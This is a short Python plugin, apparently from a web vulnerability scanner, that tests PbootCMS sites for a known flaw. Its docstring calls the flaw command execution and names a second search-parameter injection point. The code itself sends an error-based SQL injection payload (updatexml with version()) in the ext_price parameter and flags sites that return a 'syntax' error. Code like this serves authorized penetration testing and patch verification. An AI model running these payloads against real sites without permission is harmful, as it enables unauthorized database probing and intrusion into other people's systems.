#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from aiohttp import FormData
from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):
    '''
    PbootCMS v1.3.2命令执行
    另外还有 注入： PbootCMS/index.php/Search/index?keyword=pboot&you=gay  注入点在you，搜索型注入
    '''

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                for path in self.get_url_normpath_list(self.url, './PbootCMS/'):
                    if path[-1] == '/':
                        poc = "index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/version()),0x7e),1));%23=123"
                        url = path + poc
                        async with session.get(url=url) as res:
                            if res !=None:
                                text = await res.text()
                                if "syntax" in text:
                                    yield url
                                    return